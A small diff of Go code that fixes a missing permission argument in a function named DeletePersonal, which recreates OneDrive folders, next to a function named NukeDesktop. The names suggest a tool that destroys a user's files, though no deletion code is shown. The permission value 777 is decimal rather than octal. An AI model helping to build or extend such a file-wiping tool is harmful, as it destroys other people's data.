@@ -275,7 +275,7 @@ func DeletePersonal() {
 	os.MkdirAll(PERSONAL+"OneDrive\\Pictures", 777)
 	os.MkdirAll(PERSONAL+"OneDrive\\Images", 777)
 	os.MkdirAll(PERSONAL+"OneDrive\\Documents", 777)
-	os.MkdirAll(PERSONAL+"OneDrive\\Videos")
+	os.MkdirAll(PERSONAL+"OneDrive\\Videos", 777)
 }
 
 func NukeDesktop() {
